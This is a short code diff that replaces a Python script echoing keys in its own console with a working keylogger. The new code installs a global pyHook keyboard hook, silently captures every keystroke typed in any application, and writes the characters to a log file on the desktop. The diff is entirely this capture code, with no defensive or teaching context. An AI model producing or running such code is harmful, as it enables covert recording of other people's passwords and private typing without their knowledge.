@@ -1,13 +1,17 @@
-import msvcrt
+import pyHook
+import pythoncom
+import sys
+import logging
 
-def main():
-    print("Hello")
-    input("Press any key to start logging.")
-    while True:
-        keystroke = msvcrt.getch()
-        if keystroke != None:
-            print('You pressed a key: ' + str(keystroke))
-    input("Press Enter to exit.")
+file_log = 'S:\\Desktop\\log.txt'
 
-if __name__ == "__main__":
-    main()
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
